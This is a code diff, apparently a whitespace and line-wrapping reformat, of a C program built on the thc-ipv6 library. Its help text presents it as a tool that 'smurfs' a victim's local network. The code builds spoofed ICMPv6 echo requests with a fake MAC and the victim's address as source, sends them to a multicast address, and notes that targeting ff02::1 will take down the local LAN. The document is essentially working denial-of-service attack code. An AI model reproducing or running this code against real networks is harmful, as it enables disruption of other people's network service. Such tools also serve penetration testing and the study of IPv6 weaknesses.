@@ -16,19 +16,18 @@ void help(char *prg) {
   printf("Smurfs the local network of the victim. Note: this depends on an\n");
   printf("implementation error, currently only verified on Linux.\n");
   printf("Evil: \"ff02::1\" as victim will DOS your local LAN completely\n");
-//  printf("Use -r to use raw mode.\n\n");
+  //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
 
 int main(int argc, char *argv[]) {
   unsigned char *pkt = NULL, buf[16], fakemac[7] = "\x00\x00\xde\xad\xbe\xef";
   unsigned char *multicast6, *victim6;
-  int pkt_len = 0;
-  char *interface;
-  int rawmode = 0;
+  int            pkt_len = 0;
+  char *         interface;
+  int            rawmode = 0;
 
-  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
-    help(argv[0]);
+  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);
 
   if (strcmp(argv[1], "-r") == 0) {
     thc_ipv6_rawmode(1);
@@ -46,9 +45,12 @@ int main(int argc, char *argv[]) {
   }
 
   memset(buf, 'A', 16);
-  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, multicast6, victim6, 0, 0, 0, 0, 0)) == NULL)
+  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len,
+                                      multicast6, victim6, 0, 0, 0, 0, 0)) ==
+      NULL)
     return -1;
-  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe, (unsigned char *) &buf, 16, 0) < 0)
+  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
+                    (unsigned char *)&buf, 16, 0) < 0)
     return -1;
   if (thc_generate_pkt(interface, fakemac, NULL, pkt, &pkt_len) < 0) {
     fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
